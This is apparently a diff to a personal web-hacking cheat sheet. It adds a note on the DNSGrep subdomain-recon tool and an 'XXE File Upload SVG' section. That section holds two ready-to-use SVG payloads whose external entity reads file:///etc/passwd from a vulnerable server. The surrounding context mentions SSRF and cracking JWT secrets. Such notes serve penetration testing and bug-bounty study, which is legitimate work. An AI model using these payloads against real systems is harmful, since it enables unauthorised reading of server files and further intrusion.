@@ -146,6 +146,17 @@ https://opendata.rapid7.com/sonar.fdns_v2/
 
 
 
+#### Rapid7 FDNS (Part 3 with DNSGrep)
+
+```powershell
+#https://github.com/erbbysam/dnsgrep
+
+Not tried this much yet but DNS Grep tool based around Rapid7 Sonar DNS
+
+
+```
+
+
 
 
 
@@ -1539,6 +1550,18 @@ SSRF
 </methodCall>
 ```
 
+#### XXE File Upload SVG
+
+```powershell
+#https://0xatul.github.io/posts/2020/02/external-xml-entity-via-file-upload-svg/
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+<svg>&xxe;</svg>
+
+<?xml version="1.0" encdoing="UTF-8" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd" > ]><svg width="512px" height="512px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="14" x="0" y="16">&xxe;</text></svg>  
+
+```
 
 
 
@@ -1556,9 +1579,6 @@ SSRF
 WAF evasion if any.
 ```
 
-
-
-
 #### JWT Exploiting
 
 ```powershell
@@ -1573,3 +1593,4 @@ Full details above.
 
 4) JWT Crack - https://github.com/brendan-rius/c-jwt-cracker - Secret used to encrypt tokens may be weak.
 ```
+
